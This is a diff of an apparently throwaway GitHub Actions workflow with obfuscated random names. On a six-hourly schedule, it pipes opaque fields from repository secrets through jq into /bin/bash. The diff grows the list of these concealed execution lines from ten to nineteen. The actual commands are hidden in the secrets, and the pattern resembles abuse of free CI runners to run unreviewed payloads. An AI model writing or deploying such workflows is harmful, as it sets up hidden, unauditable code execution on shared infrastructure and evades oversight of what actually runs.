@@ -1,26 +1,36 @@
 name: niuyaorao3187
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '12 2/6 * * *'
+    - cron: '2 4/6 * * *'
 
-jobs:  # 3975
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: niuyaorao3187
         env:
-          gan3: ${{ secrets.gan3 }}
+          ex18: ${{ secrets.ex18 }}
         run: |
-          echo $gan3 | jq -r .vuo426 | /bin/bash
-          echo $o193 | jq -r .prc3096 | /bin/bash
-          echo $peypd23613 | jq -r .g5 | /bin/bash
-          echo $mhnmq62 | jq -r .a48834 | /bin/bash
-          echo $jnbdw9709 | jq -r .qnr53 | /bin/bash
-          echo $ru4 | jq -r .aq08116 | /bin/bash
-          echo $ardbv87 | jq -r .yir6 | /bin/bash
-          echo $pqhkq3508 | jq -r .swww52 | /bin/bash
-          echo $ay0 | jq -r .neq44 | /bin/bash
-          echo $mdsok07993 | jq -r .hypwb103 | /bin/bash
+          echo $ex18 | jq -r .qojxk2540 | /bin/bash
+          echo $gli35 | jq -r .egip14051 | /bin/bash
+          echo $wfes83 | jq -r .hagf6 | /bin/bash
+          echo $q1720 | jq -r .zhwba2739 | /bin/bash
+          echo $n45256 | jq -r .bvds2687 | /bin/bash
+          echo $gqtir771 | jq -r .baibf7485 | /bin/bash
+          echo $rijh74 | jq -r .pw60779 | /bin/bash
+          echo $f9 | jq -r .o75370 | /bin/bash
+          echo $nncop82 | jq -r .ku92 | /bin/bash
+          echo $rj41019 | jq -r .t39 | /bin/bash
+          echo $qwiyv36072 | jq -r .gwaww1387 | /bin/bash
+          echo $hru046 | jq -r .yexa1 | /bin/bash
+          echo $m938 | jq -r .bgo333 | /bin/bash
+          echo $uiqe4 | jq -r .esf9 | /bin/bash
+          echo $kgxe28486 | jq -r .pe71530 | /bin/bash
+          echo $zx9788 | jq -r .kean21 | /bin/bash
+          echo $iir22 | jq -r .sbpbq746 | /bin/bash
+          echo $pcsjh138 | jq -r .o02 | /bin/bash
+          echo $ewe330 | jq -r .xexpo90616 | /bin/bash
 
